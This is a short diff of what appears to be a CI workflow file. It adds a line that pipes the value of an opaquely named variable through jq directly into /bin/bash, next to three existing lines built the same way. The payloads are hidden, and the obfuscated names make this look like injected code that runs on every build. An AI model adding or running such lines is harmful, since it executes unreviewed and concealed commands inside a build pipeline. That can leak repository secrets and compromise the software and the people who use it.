@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$appsx71060" | jq -r .hhey4 | /bin/bash
           echo $c02 | jq -r .o7433 | /bin/bash
           echo $t89 | jq -r .zie3556 | /bin/bash
+          printf '%s' "$t28" | jq -r .a176 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
